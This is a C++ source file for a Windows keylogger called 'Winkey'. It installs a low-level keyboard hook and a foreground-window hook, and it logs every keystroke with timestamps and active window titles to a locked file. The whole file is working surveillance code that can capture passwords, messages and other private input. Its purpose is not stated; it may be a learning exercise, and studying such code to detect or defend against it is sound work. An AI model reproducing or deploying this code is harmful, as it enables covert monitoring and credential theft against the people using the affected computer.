#include "winkey.h"

Winkey::Winkey() {
	/* Create or Open the logfile */
	gLogHandle = CreateFileA(
		LOG_FILE,
		FILE_GENERIC_WRITE,
		0,
		nullptr,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr
	);
	if (gLogHandle == INVALID_HANDLE_VALUE) {
		throw std::runtime_error(std::format("CreateFile failed ({})\n", GetLastError()));
	}

	/* Place file ptr to FILE_END*/
	LARGE_INTEGER size;
	GetFileSizeEx(gLogHandle, &size);
	LARGE_INTEGER size2;
	LARGE_INTEGER offset;
	ZeroMemory(&offset, sizeof offset);
	SetFilePointerEx(gLogHandle, offset, &size2, FILE_END);

	/* Place an exclusive flock on the logfile */
	OVERLAPPED overlap = { 0 };
	if (!LockFileEx(
		gLogHandle,
		LOCKFILE_EXCLUSIVE_LOCK | LOCKFILE_FAIL_IMMEDIATELY,
		0,
		1,
		0,
		&overlap
	)) {
		throw std::runtime_error(std::format("LockFileEx failed ({})\n", GetLastError()));
	}
}

Winkey::~Winkey() {
	if (gLogHandle == nullptr) {
		return;
	}

	OVERLAPPED overlap = { 0 };

	/* Release the file */
	if (!UnlockFileEx(gLogHandle, 0, 1, 0, &overlap)) {
		std::cout << std::format("UnlockFileEx failed ({})\n", GetLastError());
	}
	CloseHandle(gLogHandle);

	gLogHandle = nullptr;
}

int Winkey::Hook() {
	/* Setting up window hook */
	HWINEVENTHOOK winHook = SetWinEventHook(
		EVENT_SYSTEM_FOREGROUND,
		EVENT_SYSTEM_FOREGROUND,
		nullptr,
		(WINEVENTPROC) & Winkey::onWindow,
		0,
		0,
		WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS
	);
	if (winHook == nullptr) {
		std::cout << std::format("SetWinEventHook failed ({})\n", GetLastError());
		return 1;
	}

	/* Init first window */
	GetWindowText(GetForegroundWindow(), gLastWindowTitle, 512);
	gReportNextWindow = true;

	/* Setting up keyBoard hook */
	HHOOK kbdHook = SetWindowsHookExA(
		WH_KEYBOARD_LL,
		&Winkey::onKey,
		NULL,
		0
	);
	if (kbdHook == nullptr) {
		std::cout << std::format("SetWindowsHookExA failed ({})\n", GetLastError());
		return 1;
	}

	/* Infinite hook incoming message, to stay alive */
	MSG msg;
	while (GetMessage(&msg, NULL, WM_INPUT, 0) > 0) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

/*
	HOOKPROC onKey;
*/
LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
	/* If a Key has been pressed */
	if (wParam == WM_KEYDOWN || wParam == WM_KEYUP) {
		/* Align data */
		KBDLLHOOKSTRUCT* kbdEv = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);

		/* Log Window that triggered the event */
		logCurrentWindow();

		/* Solving key */
		std::string to_write = "";
		if (wParam == WM_KEYDOWN) {
			to_write = solve(kbdEv);
		}
		else if (wParam == WM_KEYUP) {
			/* Log release of shift and ctrl */
			switch (kbdEv->vkCode) {
			case VK_SHIFT:
			case VK_LSHIFT:
			case VK_RSHIFT:
				to_write = std::string("[/SHIFT]");
				break;
			case VK_CONTROL:
			case VK_LCONTROL:
			case VK_RCONTROL:
				to_write = std::string("[/CTRL]");
				break;
			default:;
			}
		}

		/* Early skip */
		if (to_write.length() == 0) {
			return CallNextHookEx(NULL, nCode, wParam, lParam);
		}

		/* Writing key to file */
		DWORD bytesWrote;
		WriteFile(gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
	}

	/* Forward to next hooks ... */
	return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
	WINEVENTPROC onWindow;
*/
LRESULT CALLBACK Winkey::onWindow(HWINEVENTHOOK hWinEventHook,
	DWORD event,
	HWND hwnd,
	LONG idObject,
	LONG idChild,
	DWORD idEventThread,
	DWORD dwmsEventTime
) {
	(void)hWinEventHook;
	(void)event;
	(void)idObject;
	(void)idChild;
	(void)idEventThread;
	(void)dwmsEventTime;

	/* Fetching ev window */
	TCHAR currentWindow[512] = { 0 };
	GetWindowText(hwnd, currentWindow, 512);

	/* Compare with last window before registering the changes */
	if (strcmp(currentWindow, gLastWindowTitle) != 0) {
		GetWindowText(hwnd, gLastWindowTitle, 512);
		gReportNextWindow = true;
	}
	return 0;
}

std::string Winkey::solve(KBDLLHOOKSTRUCT *kbdEv) {
	switch (kbdEv->vkCode) {
	case VK_BACK:		return std::string("[BACKSPACE]");
	case VK_ESCAPE:		return std::string("[ESC]");
	case VK_DELETE:		return std::string("[DELETE]");
	case VK_LEFT:		return std::string("[LEFTARROW]");
	case VK_UP:			return std::string("[UPARROW]");
	case VK_RIGHT:		return std::string("[RIGHTARROW]");
	case VK_DOWN:		return std::string("[DOWNARROW]");
	case VK_SPACE:		return std::string(" ");
	case VK_TAB:		return std::string("[TAB]");
	case VK_CAPITAL:	return std::string("[CAPSLOCK]");
	case VK_SHIFT:
	case VK_LSHIFT:
	case VK_RSHIFT:		return std::string("[SHIFT]");
	case VK_CONTROL:
	case VK_LCONTROL:
	case VK_RCONTROL:	return std::string("[CTRL]");
	case VK_RETURN:		return std::string("\\n");
	default:
		BYTE keyboardState[256];
		GetKeyboardState(keyboardState);

		CHAR unicodeBuffer[16] = {0};
		ToUnicodeEx(
			kbdEv->vkCode,
			kbdEv->scanCode,
			keyboardState,
			reinterpret_cast<LPWSTR>(unicodeBuffer),
			8,
			0,
			GetKeyboardLayout(0)
		);

		std::string fmt(unicodeBuffer);

		return fmt;
	}
}

void Winkey::logCurrentWindow() {
	if (!gReportNextWindow) {
		return;
	}

	/* We are reporting, changing state */
	gReportNextWindow = false;

	/* Getting local time */
	std::time_t t = std::time(nullptr);
	struct tm new_time;
	localtime_s(&new_time, &t);

	/* Formatting time */
	char mbstr[100 + sizeof gLastWindowTitle] = {0};
	std::strftime(mbstr, sizeof mbstr, "%d.%m.%Y %H:%M:%S", &new_time);

	/* Preparing payload to write, with time and lastWindowTitle */
	std::string to_write = std::format("\n[{}] - '{}'\n", mbstr, gLastWindowTitle);

	/* Writing payload to file */
	DWORD bytesWrote;
	WriteFile(gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
}

int __cdecl _tmain(int argc, TCHAR* argv[])
{
	(void)argv;
	if (argc != 1) {
		return 1;
	}

	gLogHandle = nullptr;

	try {
		auto winkey = Winkey();
		return winkey.Hook();
	 }
	catch (const std::runtime_error& e) {
		std::cout << e.what();
		return 1;
	}
}